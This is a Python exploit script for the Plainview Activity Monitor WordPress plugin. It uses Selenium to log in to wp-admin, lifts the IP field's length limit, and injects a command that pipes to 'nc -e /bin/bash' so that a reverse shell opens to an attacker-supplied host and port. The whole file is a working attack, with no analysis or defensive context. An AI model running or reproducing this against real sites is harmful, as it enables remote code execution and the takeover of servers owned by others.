import sys, requests, urllib
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

def main():
    login = f"http://{domain}/wp-login.php"
    admin = f"http://{domain}/wp-admin/"
    driver = webdriver.Firefox()
    driver.get(login)
    driver.find_element_by_id('user_login').send_keys(creds[0])
    driver.find_element_by_id('user_pass').send_keys(creds[1])
    driver.find_element_by_id('wp-submit').click()
    driver.get(f"http://{domain}/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools")
    element = driver.find_element_by_id('plainview_sdk_pvam_form2_inputs_text_ip')
    driver.execute_script("arguments[0].setAttribute('maxlength','100')", element)
    driver.find_element_by_id('plainview_sdk_pvam_form2_inputs_text_ip').send_keys(f'|nc -e /bin/bash {sys.argv[3]} {sys.argv[4]}')
    driver.find_element_by_id('plainview_sdk_pvam_wordpress_form2_inputs_secondary_button_lookup').click()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target domain> <username:password> <local IP> <port>")
        print(f"Example: {sys.argv[0]} wordpress.com admin:admin 127.0.0.1 4444")
        sys.exit()
    domain = sys.argv[1]
    creds = sys.argv[2].split(":")
    if len(creds) != 2:
        creds = [creds[0], creds[1:]]
    main()
